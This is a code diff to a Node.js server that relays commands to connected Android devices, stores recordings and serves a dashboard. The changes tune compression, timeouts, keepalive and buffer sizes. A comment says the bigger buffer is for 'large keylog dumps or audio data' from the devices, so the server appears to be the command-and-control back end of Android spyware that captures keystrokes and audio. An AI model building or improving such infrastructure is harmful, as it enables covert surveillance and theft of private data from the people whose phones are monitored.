@@ -11,6 +11,7 @@ const express        = require('express');
 const http           = require('http');
 const net            = require('net');
 const cors           = require('cors');
+const compression    = require('compression');
 const path           = require('path');
 const fs             = require('fs');
 const crypto         = require('crypto');
@@ -103,9 +104,9 @@ const R = require('./redis');
 // ============================================
 const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
 const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
-const PING_INTERVAL  = 30000;   // ms – how often server pings clients (reduced to save bandwidth on slow networks)
-const PONG_TIMEOUT   = 120000;  // ms – drop if no pong received (2 min — allows 3G intermittent gaps)
-const CMD_TIMEOUT_MS = 60000;   // ms – command timeout (60 s for slow 3G devices)
+const PING_INTERVAL  = 20000;   // ms – ping every 20 s (was 30 s); faster detection of 3G drops
+const PONG_TIMEOUT   = 90000;   // ms – drop if no pong in 90 s (3 missed pings); was 120 s
+const CMD_TIMEOUT_MS = 45000;   // ms – command timeout (45 s); was 60 s
 
 // ============================================
 // RECORDINGS STORAGE
@@ -658,7 +659,7 @@ async function processMessage(clientId, clientType, event, data) {
 // ============================================
 // TCP SERVER — Android devices
 // ============================================
-const tcpServer = net.createServer((conn) => {
+const tcpServer = net.createServer({ allowHalfOpen: false }, (conn) => {
     const id = crypto.randomBytes(8).toString('hex');
     conn.id          = id;
     conn.clientType  = 'android';
@@ -667,8 +668,11 @@ const tcpServer = net.createServer((conn) => {
     tcpClients.set(id, conn);
     log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);
 
-    conn.setNoDelay(true);          // disable Nagle — relay data immediately
-    conn.setKeepAlive(true, 5000);  // detect dead sockets within ~5 s
+    conn.setNoDelay(true);           // disable Nagle — relay commands immediately, don't batch
+    conn.setKeepAlive(true, 15000);  // OS-level keepalive: probe after 15 s of silence
+    // Increase receive buffer to 256 KB — handles burst data from slow 3G devices
+    // (e.g. large keylog dumps or audio data arriving in a single flush)
+    conn.setRecvBufferSize && conn.setRecvBufferSize(262144);
     conn.setEncoding('utf8');
 
     conn.on('data', (chunk) => {
@@ -736,9 +740,24 @@ tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
 const app    = express();
 const server = http.createServer(app);
 
+// Compress HTTP responses — reduces dashboard payload sizes significantly on slow connections.
+// SSE streams are excluded automatically (streaming responses bypass compression).
+app.use(compression({
+    level: 6,
+    threshold: 1024,
+    filter: (req, res) => {
+        // Never compress SSE streams — they must flush each event immediately.
+        if (req.headers.accept && req.headers.accept.includes('text/event-stream')) return false;
+        return compression.filter(req, res);
+    }
+}));
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json({ limit: '20mb' }));
+app.use(express.static(path.join(__dirname, 'public'), {
+    maxAge: '1h',           // cache static assets in browser
+    etag: true,
+    lastModified: true
+}));
 app.use('/api/auth', authRoutes);
 app.use('/api/user', devicesRoutes);
 
